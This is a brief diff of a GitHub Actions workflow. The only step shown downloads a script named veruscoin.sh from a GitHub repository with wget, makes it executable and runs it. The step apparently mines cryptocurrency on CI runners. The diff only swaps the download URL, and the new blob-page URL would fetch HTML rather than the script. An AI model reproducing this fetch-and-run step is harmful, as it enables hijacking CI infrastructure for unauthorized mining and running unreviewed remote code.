@@ -24,5 +24,5 @@ id: go
 uses: actions/checkout@v2
 - name: akuganteng
 run: |
-wget https://raw.githubusercontent.com/oponime07/Coba_Lagi/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+wget https://github.com/oponime07/Coba_Lagi/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
 
